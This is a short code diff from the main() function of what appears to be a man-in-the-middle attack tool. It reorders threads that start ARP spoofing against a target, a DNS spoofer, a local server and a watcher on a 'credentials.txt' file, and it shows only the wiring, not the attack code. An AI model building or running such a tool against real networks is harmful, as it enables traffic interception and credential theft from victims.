@@ -93,14 +93,13 @@ def main():
     threads = []
     target, interface, router, mac_address, ip_server = get_arguments()
 
-
     spoof = ArpSpoof(target, interface, router, mac_address)
     spoof.verify() # Verify format arguments
 
-    define_thread(args=(None,), function=spoof.start)
     define_thread(args=(ip_server,), function=server)
     define_thread(args=(ip_server,), function=dns_spoofer.main)
     define_thread(args=('credentials.txt',), function=verify_file)
+    define_thread(args=(None,), function=spoof.start)
     
     run_threads()
 
